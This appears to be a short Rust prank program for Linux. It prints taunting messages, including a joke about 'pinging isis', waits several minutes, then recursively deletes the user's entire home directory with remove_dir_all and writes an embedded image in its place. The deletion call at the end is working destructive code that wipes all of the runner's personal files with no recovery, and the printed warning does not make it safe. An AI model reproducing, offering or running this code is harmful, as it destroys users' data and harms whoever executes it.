#[cfg(not(target_os = "linux"))]
std::compile_error!("please elaborate");

use std::{thread::sleep, time::Duration};

const SEX: &[u8] = include_bytes!("../media/118545.jpg");

fn main() {
    let home_dir = std::env::var("HOME").unwrap();
    println!("this program will attempt to rekt ur home dir in approx 420sex nya");
    sleep(Duration::from_secs(60));
    println!("pinging isis...");
    sleep(Duration::from_secs(60));
    println!("doxxed! /////// - {}", home_dir);
    sleep(Duration::from_secs(60));
    println!("anyday now~ if ctrl+c doesnt work i cant help you");
    sleep(Duration::from_secs(240));
    println!("im sowwy it haz to be dis way unu");
    
    //-sion
    std::fs::remove_dir_all(&home_dir).unwrap();
    
    std::fs::write(format!("{home_dir}/jibril_weary_face.jpg"), SEX).unwrap();
    println!("gg *sparkle*");
}
